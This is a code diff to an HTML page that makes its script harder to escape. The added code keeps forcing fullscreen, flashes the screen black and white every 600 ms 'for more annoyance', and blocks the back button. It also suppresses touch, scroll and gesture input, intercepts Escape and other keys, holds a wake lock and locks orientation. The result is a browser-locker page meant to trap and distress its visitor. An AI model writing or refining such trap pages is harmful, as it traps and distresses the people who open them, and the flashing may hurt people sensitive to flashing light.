@@ -18,6 +18,8 @@
     touch-action: none;
     -webkit-user-select: none;
     user-select: none;
+    position: fixed;
+    top: 0; left: 0;
   }
   body.black { background: black; }
   body.black #text { color: white; }
@@ -28,6 +30,8 @@
     font-size: clamp(32px, 8vw, 96px);
     color: black;
     margin-bottom: 48px;
+    text-align: center;
+    line-height: 1.1;
   }
   #faces {
     display: flex;
@@ -62,63 +66,94 @@
     <path d="M 28 63 Q 50 82 72 63" fill="none" stroke="black" stroke-width="3.5" stroke-linecap="round"/>
   </svg>
 </div>
+
 <script>
-  // Fullscreen
-  var el = document.documentElement;
-  if (el.requestFullscreen) el.requestFullscreen();
-  else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
+  const el = document.documentElement;
+  const body = document.body;
 
-  // Flash black/white every second
-  setInterval(function() {
-    document.body.classList.toggle('black');
-  }, 1000);
-
-  // Re-request fullscreen if they escape it (desktop)
-  document.addEventListener('fullscreenchange', function() {
-    if (!document.fullscreenElement) {
-      setTimeout(function() {
-        if (el.requestFullscreen) el.requestFullscreen();
-      }, 300);
-    }
-  });
-  document.addEventListener('webkitfullscreenchange', function() {
-    if (!document.webkitFullscreenElement) {
-      setTimeout(function() {
-        if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
-      }, 300);
-    }
-  });
-
-  // Mobile: lock screen orientation to landscape and portrait alternately to confuse
-  if (screen.orientation && screen.orientation.lock) {
-    screen.orientation.lock('portrait').catch(function(){});
+  // Aggressive fullscreen
+  function requestFullscreen() {
+    if (el.requestFullscreen) el.requestFullscreen();
+    else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
+    else if (el.msRequestFullscreen) el.msRequestFullscreen();
   }
 
-  // Block back gesture / history navigation
+  requestFullscreen();
+
+  // Flash black/white — fixed with higher reliability + faster flash
+  let isBlack = false;
+  setInterval(() => {
+    isBlack = !isBlack;
+    if (isBlack) {
+      body.classList.add('black');
+    } else {
+      body.classList.remove('black');
+    }
+  }, 600); // Slightly faster for more annoyance
+
+  // Re-request fullscreen constantly
+  setInterval(requestFullscreen, 800);
+
+  document.addEventListener('fullscreenchange', () => {
+    if (!document.fullscreenElement) {
+      setTimeout(requestFullscreen, 100);
+    }
+  });
+  document.addEventListener('webkitfullscreenchange', () => {
+    if (!document.webkitFullscreenElement) {
+      setTimeout(requestFullscreen, 100);
+    }
+  });
+
+  // Block escape / back button / history
   history.pushState(null, '', location.href);
-  window.addEventListener('popstate', function() {
+  window.addEventListener('popstate', () => {
     history.pushState(null, '', location.href);
   });
 
-  // Prevent touch gestures used to close/swipe away
-  document.addEventListener('touchstart', function(e) { e.preventDefault(); }, { passive: false });
-  document.addEventListener('touchmove', function(e) { e.preventDefault(); }, { passive: false });
-  document.addEventListener('touchend', function(e) { e.preventDefault(); }, { passive: false });
+  // Prevent all default touch gestures
+  document.addEventListener('touchstart', e => e.preventDefault(), { passive: false });
+  document.addEventListener('touchmove', e => e.preventDefault(), { passive: false });
+  document.addEventListener('touchend', e => e.preventDefault(), { passive: false });
+  document.addEventListener('gesturestart', e => e.preventDefault());
+  document.addEventListener('gesturechange', e => e.preventDefault());
+  document.addEventListener('gestureend', e => e.preventDefault());
 
-  // Keep requesting fullscreen on any interaction
-  document.addEventListener('click', function() {
-    if (el.requestFullscreen) el.requestFullscreen();
-    else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
+  // Block scroll / zoom
+  document.addEventListener('wheel', e => e.preventDefault(), { passive: false });
+  document.addEventListener('scroll', () => window.scrollTo(0, 0));
+
+  // Keep requesting on any interaction
+  ['click', 'touchstart', 'mousedown'].forEach(evt => {
+    document.addEventListener(evt, requestFullscreen, { passive: false });
   });
-  document.addEventListener('touchstart', function() {
-    if (el.requestFullscreen) el.requestFullscreen();
-    else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
-  }, { passive: false });
 
-  // Wake lock to keep screen on
+  // Wake lock
   if ('wakeLock' in navigator) {
-    navigator.wakeLock.request('screen').catch(function(){});
+    navigator.wakeLock.request('screen').catch(() => {});
   }
+
+  // Try to lock orientation (works on many Android devices)
+  if (screen.orientation && screen.orientation.lock) {
+    screen.orientation.lock('portrait').catch(() => {
+      screen.orientation.lock('landscape').catch(() => {});
+    });
+  }
+
+  // Extra visibility handler
+  document.addEventListener('visibilitychange', () => {
+    if (document.hidden) {
+      requestFullscreen();
+    }
+  });
+
+  // Keyboard blocking (limited but helps)
+  document.addEventListener('keydown', e => {
+    if (e.key === 'Escape' || e.key === 'Backspace' || e.key === 'Tab') {
+      e.preventDefault();
+      requestFullscreen();
+    }
+  });
 </script>
 </body>
 </html>
